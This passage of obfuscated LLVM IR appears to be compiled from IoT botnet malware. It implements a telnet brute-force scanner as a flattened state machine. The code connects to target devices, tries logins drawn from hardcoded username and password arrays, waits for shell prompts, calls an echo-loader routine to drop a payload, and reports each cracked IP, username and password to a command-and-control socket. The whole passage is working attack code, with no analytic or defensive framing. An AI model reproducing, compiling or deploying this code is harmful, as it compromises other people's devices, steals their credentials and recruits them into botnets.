  %1919 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload101, i64 %1918
  %1920 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1919, i32 0, i32 0
  %1921 = load i32, i32* %1920, align 16
  %1922 = call i32 @sclose(i32 %1921)
  %1923 = load i32, i32* %2, align 4
  %1924 = sext i32 %1923 to i64
  %.reload100 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem26
  %1925 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload100, i64 %1924
  %1926 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1925, i32 0, i32 2
  store i8 0, i8* %1926, align 8
  %1927 = load i32, i32* %2, align 4
  %1928 = sext i32 %1927 to i64
  %.reload99 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem26
  %1929 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload99, i64 %1928
  %1930 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1929, i32 0, i32 3
  store i8 0, i8* %1930, align 1
  store i32 -1653477229, i32* %switchVar
  br label %loopEnd

; <label>:1931:                                   ; preds = %loopEntry
  %1932 = load i32, i32* %2, align 4
  %1933 = sext i32 %1932 to i64
  %.reload98 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem26
  %1934 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload98, i64 %1933
  %1935 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1934, i32 0, i32 2
  store i8 7, i8* %1935, align 8
  store i32 -1540120301, i32* %switchVar
  br label %loopEnd

; <label>:1936:                                   ; preds = %loopEntry
  %1937 = load i32, i32* %2, align 4
  %1938 = sext i32 %1937 to i64
  %.reload97 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem26
  %1939 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload97, i64 %1938
  %1940 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1939, i32 0, i32 8
  %1941 = load i8*, i8** %1940, align 8
  call void @llvm.memset.p0i8.i64(i8* %1941, i8 0, i64 1024, i32 1, i1 false)
  store i32 -1653477229, i32* %switchVar
  br label %loopEnd

; <label>:1942:                                   ; preds = %loopEntry
  %1943 = load i32, i32* %2, align 4
  %1944 = sext i32 %1943 to i64
  %.reload96 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem26
  %1945 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload96, i64 %1944
  %1946 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1945, i32 0, i32 8
  %1947 = load i8*, i8** %1946, align 8
  %1948 = call i64 @strlen(i8* %1947) #10
  %1949 = trunc i64 %1948 to i16
  %1950 = load i32, i32* %2, align 4
  %1951 = sext i32 %1950 to i64
  %.reload95 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem26
  %1952 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload95, i64 %1951
  %1953 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1952, i32 0, i32 7
  store i16 %1949, i16* %1953, align 16
  store i32 -974629979, i32* %switchVar
  br label %loopEnd

; <label>:1954:                                   ; preds = %loopEntry
  %1955 = load i32, i32* %2, align 4
  %1956 = sext i32 %1955 to i64
  %.reload94 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem26
  %1957 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload94, i64 %1956
  %1958 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1957, i32 0, i32 6
  %1959 = load i32, i32* %1958, align 4
  %1960 = add i32 %1959, 10
  %1961 = zext i32 %1960 to i64
  %1962 = call i64 @time(i64* null) #2
  %1963 = icmp slt i64 %1961, %1962
  %1964 = select i1 %1963, i32 1784333176, i32 -1912568534
  store i32 %1964, i32* %switchVar
  br label %loopEnd

; <label>:1965:                                   ; preds = %loopEntry
  %1966 = load i32, i32* %2, align 4
  %1967 = sext i32 %1966 to i64
  %.reload93 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem26
  %1968 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload93, i64 %1967
  %1969 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1968, i32 0, i32 0
  %1970 = load i32, i32* %1969, align 16
  %1971 = call i32 @sclose(i32 %1970)
  %1972 = load i32, i32* %2, align 4
  %1973 = sext i32 %1972 to i64
  %.reload92 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem26
  %1974 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload92, i64 %1973
  %1975 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1974, i32 0, i32 2
  store i8 0, i8* %1975, align 8
  %1976 = load i32, i32* %2, align 4
  %1977 = sext i32 %1976 to i64
  %.reload91 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem26
  %1978 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload91, i64 %1977
  %1979 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1978, i32 0, i32 3
  store i8 1, i8* %1979, align 1
  store i32 -1912568534, i32* %switchVar
  br label %loopEnd

; <label>:1980:                                   ; preds = %loopEntry
  store i32 1068643273, i32* %switchVar
  br label %loopEnd

; <label>:1981:                                   ; preds = %loopEntry
  %1982 = load i32, i32* %2, align 4
  %1983 = sext i32 %1982 to i64
  %.reload90 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem26
  %1984 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload90, i64 %1983
  %1985 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1984, i32 0, i32 0
  %1986 = load i32, i32* %1985, align 16
  %1987 = call i64 @send(i32 %1986, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.72, i32 0, i32 0), i64 4, i32 16384)
  %1988 = icmp slt i64 %1987, 0
  %1989 = select i1 %1988, i32 1977211686, i32 -1680623417
  store i32 %1989, i32* %switchVar
  br label %loopEnd

; <label>:1990:                                   ; preds = %loopEntry
  %1991 = load i32, i32* %2, align 4
  %1992 = sext i32 %1991 to i64
  %.reload89 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem26
  %1993 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload89, i64 %1992
  %1994 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1993, i32 0, i32 0
  %1995 = load i32, i32* %1994, align 16
  %1996 = call i32 @sclose(i32 %1995)
  %1997 = load i32, i32* %2, align 4
  %1998 = sext i32 %1997 to i64
  %.reload88 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem26
  %1999 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload88, i64 %1998
  %2000 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1999, i32 0, i32 2
  store i8 0, i8* %2000, align 8
  %2001 = load i32, i32* %2, align 4
  %2002 = sext i32 %2001 to i64
  %.reload87 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem26
  %2003 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload87, i64 %2002
  %2004 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2003, i32 0, i32 3
  store i8 1, i8* %2004, align 1
  store i32 -1653477229, i32* %switchVar
  br label %loopEnd

; <label>:2005:                                   ; preds = %loopEntry
  %2006 = load i32, i32* %2, align 4
  %2007 = sext i32 %2006 to i64
  %.reload86 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem26
  %2008 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload86, i64 %2007
  %2009 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2008, i32 0, i32 2
  store i8 8, i8* %2009, align 8
  store i32 1068643273, i32* %switchVar
  br label %loopEnd

; <label>:2010:                                   ; preds = %loopEntry
  %2011 = load i32, i32* %2, align 4
  %2012 = sext i32 %2011 to i64
  %.reload85 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem26
  %2013 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload85, i64 %2012
  %2014 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2013, i32 0, i32 0
  %2015 = load i32, i32* %2014, align 16
  %2016 = call i64 @send(i32 %2015, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.73, i32 0, i32 0), i64 7, i32 16384)
  %2017 = icmp slt i64 %2016, 0
  %2018 = select i1 %2017, i32 2069855383, i32 -1518100655
  store i32 %2018, i32* %switchVar
  br label %loopEnd

; <label>:2019:                                   ; preds = %loopEntry
  %2020 = load i32, i32* %2, align 4
  %2021 = sext i32 %2020 to i64
  %.reload84 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem26
  %2022 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload84, i64 %2021
  %2023 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2022, i32 0, i32 0
  %2024 = load i32, i32* %2023, align 16
  %2025 = call i32 @sclose(i32 %2024)
  %2026 = load i32, i32* %2, align 4
  %2027 = sext i32 %2026 to i64
  %.reload83 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem26
  %2028 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload83, i64 %2027
  %2029 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2028, i32 0, i32 2
  store i8 0, i8* %2029, align 8
  %2030 = load i32, i32* %2, align 4
  %2031 = sext i32 %2030 to i64
  %.reload82 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem26
  %2032 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload82, i64 %2031
  %2033 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2032, i32 0, i32 3
  store i8 1, i8* %2033, align 1
  store i32 -1653477229, i32* %switchVar
  br label %loopEnd

; <label>:2034:                                   ; preds = %loopEntry
  %2035 = load i32, i32* %2, align 4
  %2036 = sext i32 %2035 to i64
  %.reload81 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem26
  %2037 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload81, i64 %2036
  %2038 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2037, i32 0, i32 2
  store i8 9, i8* %2038, align 8
  store i32 1068643273, i32* %switchVar
  br label %loopEnd

; <label>:2039:                                   ; preds = %loopEntry
  %2040 = load i32, i32* %2, align 4
  %2041 = sext i32 %2040 to i64
  %.reload80 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem26
  %2042 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload80, i64 %2041
  %2043 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2042, i32 0, i32 0
  %2044 = load i32, i32* %2043, align 16
  %2045 = call i64 @send(i32 %2044, i8* getelementptr inbounds ([375 x i8], [375 x i8]* @.str, i32 0, i32 0), i64 394, i32 16384)
  %2046 = icmp slt i64 %2045, 0
  %2047 = select i1 %2046, i32 745414734, i32 103036608
  store i32 %2047, i32* %switchVar
  br label %loopEnd

; <label>:2048:                                   ; preds = %loopEntry
  %2049 = load i32, i32* %2, align 4
  %2050 = sext i32 %2049 to i64
  %.reload79 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem26
  %2051 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload79, i64 %2050
  %2052 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2051, i32 0, i32 0
  %2053 = load i32, i32* %2052, align 16
  %2054 = call i32 @sclose(i32 %2053)
  %2055 = load i32, i32* %2, align 4
  %2056 = sext i32 %2055 to i64
  %.reload78 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem26
  %2057 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload78, i64 %2056
  %2058 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2057, i32 0, i32 2
  store i8 0, i8* %2058, align 8
  %2059 = load i32, i32* %2, align 4
  %2060 = sext i32 %2059 to i64
  %.reload77 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem26
  %2061 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload77, i64 %2060
  %2062 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2061, i32 0, i32 3
  store i8 1, i8* %2062, align 1
  store i32 -1653477229, i32* %switchVar
  br label %loopEnd

; <label>:2063:                                   ; preds = %loopEntry
  %2064 = load i32, i32* @mainCommSock, align 4
  %2065 = load i32, i32* %2, align 4
  %2066 = sext i32 %2065 to i64
  %.reload76 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem26
  %2067 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload76, i64 %2066
  %2068 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2067, i32 0, i32 1
  %2069 = bitcast i32* %2068 to %struct.in_addr*
  %2070 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %2069, i32 0, i32 0
  %2071 = load i32, i32* %2070, align 4
  %2072 = call i8* @inet_ntoa(i32 %2071) #2
  %2073 = load i32, i32* %2, align 4
  %2074 = sext i32 %2073 to i64
  %.reload75 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem26
  %2075 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload75, i64 %2074
  %2076 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2075, i32 0, i32 4
  %2077 = load i8, i8* %2076, align 2
  %2078 = zext i8 %2077 to i64
  %2079 = getelementptr inbounds [4 x i8*], [4 x i8*]* @usernames, i64 0, i64 %2078
  %2080 = load i8*, i8** %2079, align 8
  %2081 = load i32, i32* %2, align 4
  %2082 = sext i32 %2081 to i64
  %.reload74 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem26
  %2083 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload74, i64 %2082
  %2084 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2083, i32 0, i32 5
  %2085 = load i8, i8* %2084, align 1
  %2086 = zext i8 %2085 to i64
  %2087 = getelementptr inbounds [13 x i8*], [13 x i8*]* @passwords, i64 0, i64 %2086
  %2088 = load i8*, i8** %2087, align 8
  %2089 = call i32 (i32, i8*, ...) @sockprintf(i32 %2064, i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.74, i32 0, i32 0), i8* %2072, i8* %2080, i8* %2088)
  %2090 = load i32, i32* %2, align 4
  %2091 = sext i32 %2090 to i64
  %.reload73 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem26
  %2092 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload73, i64 %2091
  %2093 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2092, i32 0, i32 2
  store i8 10, i8* %2093, align 8
  store i32 1068643273, i32* %switchVar
  br label %loopEnd

; <label>:2094:                                   ; preds = %loopEntry
  call void @echoLoader()
  %2095 = load i32, i32* %2, align 4
  %2096 = sext i32 %2095 to i64
  %.reload72 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem26
  %2097 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload72, i64 %2096
  %2098 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2097, i32 0, i32 0
  %2099 = load i32, i32* %2098, align 16
  %2100 = call i64 @send(i32 %2099, i8* getelementptr inbounds ([62 x i8], [62 x i8]* @.str.75, i32 0, i32 0), i64 61, i32 16384)
  %2101 = load i32, i32* %2, align 4
  %2102 = sext i32 %2101 to i64
  %.reload71 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem26
  %2103 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload71, i64 %2102
  %2104 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2103, i32 0, i32 2
  store i8 11, i8* %2104, align 8
  store i32 1068643273, i32* %switchVar
  br label %loopEnd

; <label>:2105:                                   ; preds = %loopEntry
  %2106 = load i32, i32* %2, align 4
  %2107 = sext i32 %2106 to i64
  %.reload70 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem26
  %2108 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload70, i64 %2107
  %2109 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2108, i32 0, i32 0
  %2110 = load i32, i32* %2109, align 16
  %2111 = call i64 @send(i32 %2110, i8* getelementptr inbounds ([32 x i8], [32 x i8]* @.str.76, i32 0, i32 0), i64 49, i32 16384)
  %2112 = icmp slt i64 %2111, 0
  %2113 = select i1 %2112, i32 1566444569, i32 -1448487328
  store i32 %2113, i32* %switchVar
  br label %loopEnd

; <label>:2114:                                   ; preds = %loopEntry
  %2115 = load i32, i32* %2, align 4
  %2116 = sext i32 %2115 to i64
  %.reload69 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem26
  %2117 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload69, i64 %2116
  %2118 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2117, i32 0, i32 0
  %2119 = load i32, i32* %2118, align 16
  %2120 = call i32 @sclose(i32 %2119)
  %2121 = load i32, i32* %2, align 4
  %2122 = sext i32 %2121 to i64
  %.reload68 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem26
  %2123 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload68, i64 %2122
  %2124 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2123, i32 0, i32 2
  store i8 0, i8* %2124, align 8
  %2125 = load i32, i32* %2, align 4
  %2126 = sext i32 %2125 to i64
  %.reload67 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem26
  %2127 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload67, i64 %2126
  %2128 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2127, i32 0, i32 3
  store i8 1, i8* %2128, align 1
  store i32 -1653477229, i32* %switchVar
  br label %loopEnd

; <label>:2129:                                   ; preds = %loopEntry
  %2130 = load i32, i32* %2, align 4
  %2131 = sext i32 %2130 to i64
  %.reload66 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem26
  %2132 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload66, i64 %2131
  %2133 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2132, i32 0, i32 2
  store i8 12, i8* %2133, align 8
  store i32 1527286222, i32* %switchVar
  br label %loopEnd

; <label>:2134:                                   ; preds = %loopEntry
  %2135 = load i32, i32* %2, align 4
  %2136 = sext i32 %2135 to i64
  %.reload65 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem26
  %2137 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload65, i64 %2136
  %2138 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2137, i32 0, i32 6
  %2139 = load i32, i32* %2138, align 4
  %2140 = icmp eq i32 %2139, 0
  %2141 = select i1 %2140, i32 1241434121, i32 174263979
  store i32 %2141, i32* %switchVar
  br label %loopEnd

; <label>:2142:                                   ; preds = %loopEntry
  %2143 = call i64 @time(i64* null) #2
  %2144 = trunc i64 %2143 to i32
  %2145 = load i32, i32* %2, align 4
  %2146 = sext i32 %2145 to i64
  %.reload64 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem26
  %2147 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload64, i64 %2146
  %2148 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2147, i32 0, i32 6
  store i32 %2144, i32* %2148, align 4
  store i32 174263979, i32* %switchVar
  br label %loopEnd

; <label>:2149:                                   ; preds = %loopEntry
  %2150 = load i32, i32* %2, align 4
  %2151 = sext i32 %2150 to i64
  %.reload63 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem26
  %2152 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload63, i64 %2151
  %2153 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2152, i32 0, i32 0
  %2154 = load i32, i32* %2153, align 16
  %2155 = load i32, i32* %2, align 4
  %2156 = sext i32 %2155 to i64
  %.reload62 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem26
  %2157 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload62, i64 %2156
  %2158 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2157, i32 0, i32 8
  %2159 = load i8*, i8** %2158, align 8
  %2160 = load i32, i32* %2, align 4
  %2161 = sext i32 %2160 to i64
  %.reload61 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem26
  %2162 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload61, i64 %2161
  %2163 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2162, i32 0, i32 7
  %2164 = load i16, i16* %2163, align 16
  %2165 = zext i16 %2164 to i32
  %2166 = call i32 @readUntil(i32 %2154, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.77, i32 0, i32 0), i32 0, i32 0, i32 10000, i8* %2159, i32 1024, i32 %2165)
  %2167 = icmp ne i32 %2166, 0
  %2168 = select i1 %2167, i32 -62236947, i32 1667530195
  store i32 %2168, i32* %switchVar
  br label %loopEnd

; <label>:2169:                                   ; preds = %loopEntry
  %2170 = load i32, i32* %2, align 4
  %2171 = sext i32 %2170 to i64
  %.reload60 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem26
  %2172 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload60, i64 %2171
  %2173 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2172, i32 0, i32 6
  store i32 0, i32* %2173, align 4
  %2174 = load i32, i32* %2, align 4
  %2175 = sext i32 %2174 to i64
  %.reload59 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem26
  %2176 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload59, i64 %2175
  %2177 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2176, i32 0, i32 7
  store i16 0, i16* %2177, align 16
  %2178 = load i32, i32* %2, align 4
  %2179 = sext i32 %2178 to i64
  %.reload58 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem26
  %2180 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload58, i64 %2179
  %2181 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2180, i32 0, i32 0
  %2182 = load i32, i32* %2181, align 16
  %2183 = call i64 @send(i32 %2182, i8* getelementptr inbounds ([375 x i8], [375 x i8]* @.str, i32 0, i32 0), i64 394, i32 16384)
  %2184 = load i32, i32* @mainCommSock, align 4
  %2185 = load i32, i32* %2, align 4
  %2186 = sext i32 %2185 to i64
  %.reload57 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem26
  %2187 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload57, i64 %2186
  %2188 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2187, i32 0, i32 1
  %2189 = bitcast i32* %2188 to %struct.in_addr*
  %2190 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %2189, i32 0, i32 0
  %2191 = load i32, i32* %2190, align 4
  %2192 = call i8* @inet_ntoa(i32 %2191) #2
  %2193 = load i32, i32* %2, align 4
  %2194 = sext i32 %2193 to i64
  %.reload56 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem26
  %2195 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload56, i64 %2194
  %2196 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2195, i32 0, i32 4
  %2197 = load i8, i8* %2196, align 2
  %2198 = zext i8 %2197 to i64
  %2199 = getelementptr inbounds [4 x i8*], [4 x i8*]* @usernames, i64 0, i64 %2198
  %2200 = load i8*, i8** %2199, align 8
  %2201 = load i32, i32* %2, align 4
  %2202 = sext i32 %2201 to i64
  %.reload55 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem26
  %2203 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload55, i64 %2202
  %2204 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2203, i32 0, i32 5
  %2205 = load i8, i8* %2204, align 1
  %2206 = zext i8 %2205 to i64
  %2207 = getelementptr inbounds [13 x i8*], [13 x i8*]* @passwords, i64 0, i64 %2206
  %2208 = load i8*, i8** %2207, align 8
  %2209 = call i32 (i32, i8*, ...) @sockprintf(i32 %2184, i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.74, i32 0, i32 0), i8* %2192, i8* %2200, i8* %2208)
  store i32 -1653477229, i32* %switchVar
  br label %loopEnd

; <label>:2210:                                   ; preds = %loopEntry
  %2211 = load i32, i32* %2, align 4
  %2212 = sext i32 %2211 to i64
  %.reload54 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem26
  %2213 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload54, i64 %2212
  %2214 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2213, i32 0, i32 0
  %2215 = load i32, i32* %2214, align 16
  %2216 = load i32, i32* %2, align 4
  %2217 = sext i32 %2216 to i64
  %.reload53 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem26
  %2218 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload53, i64 %2217
  %2219 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2218, i32 0, i32 8
  %2220 = load i8*, i8** %2219, align 8
  %2221 = load i32, i32* %2, align 4
  %2222 = sext i32 %2221 to i64
  %.reload52 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem26
  %2223 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload52, i64 %2222
  %2224 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2223, i32 0, i32 7
  %2225 = load i16, i16* %2224, align 16
  %2226 = zext i16 %2225 to i32
  %2227 = call i32 @readUntil(i32 %2215, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.78, i32 0, i32 0), i32 0, i32 0, i32 10000, i8* %2220, i32 1024, i32 %2226)
  %2228 = icmp ne i32 %2227, 0
  %2229 = select i1 %2228, i32 1644025112, i32 1657188774
  store i32 %2229, i32* %switchVar
  br label %loopEnd

; <label>:2230:                                   ; preds = %loopEntry
  %2231 = load i32, i32* %2, align 4
  %2232 = sext i32 %2231 to i64
  %.reload51 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem26
  %2233 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload51, i64 %2232
  %2234 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2233, i32 0, i32 6
  store i32 0, i32* %2234, align 4
  %2235 = load i32, i32* %2, align 4
  %2236 = sext i32 %2235 to i64
  %.reload50 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem26
  %2237 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload50, i64 %2236
  %2238 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2237, i32 0, i32 7
  store i16 0, i16* %2238, align 16
  %2239 = load i32, i32* %2, align 4
  %2240 = sext i32 %2239 to i64
  %.reload49 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem26
  %2241 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload49, i64 %2240
  %2242 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2241, i32 0, i32 0
  %2243 = load i32, i32* %2242, align 16
  %2244 = call i64 @send(i32 %2243, i8* getelementptr inbounds ([375 x i8], [375 x i8]* @.str, i32 0, i32 0), i64 394, i32 16384)
  %2245 = load i32, i32* @mainCommSock, align 4
  %2246 = load i32, i32* %2, align 4
  %2247 = sext i32 %2246 to i64
  %.reload48 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem26
  %2248 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload48, i64 %2247
  %2249 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2248, i32 0, i32 1
  %2250 = bitcast i32* %2249 to %struct.in_addr*
  %2251 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %2250, i32 0, i32 0
  %2252 = load i32, i32* %2251, align 4
  %2253 = call i8* @inet_ntoa(i32 %2252) #2
  %2254 = load i32, i32* %2, align 4
  %2255 = sext i32 %2254 to i64
  %.reload47 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem26
  %2256 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload47, i64 %2255
  %2257 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2256, i32 0, i32 4
  %2258 = load i8, i8* %2257, align 2
  %2259 = zext i8 %2258 to i64
  %2260 = getelementptr inbounds [4 x i8*], [4 x i8*]* @usernames, i64 0, i64 %2259
  %2261 = load i8*, i8** %2260, align 8
  %2262 = load i32, i32* %2, align 4
  %2263 = sext i32 %2262 to i64
  %.reload46 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem26
  %2264 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload46, i64 %2263
  %2265 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2264, i32 0, i32 5
  %2266 = load i8, i8* %2265, align 1
  %2267 = zext i8 %2266 to i64
  %2268 = getelementptr inbounds [13 x i8*], [13 x i8*]* @passwords, i64 0, i64 %2267
  %2269 = load i8*, i8** %2268, align 8
